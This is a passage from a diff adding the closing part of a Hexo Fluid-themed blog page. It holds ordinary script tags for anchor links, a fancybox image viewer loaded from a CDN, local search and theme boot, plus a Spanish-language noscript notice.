+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">El blog funciona mejor con JavaScript habilitado</div>
+  </noscript>
+</body>
+</html>
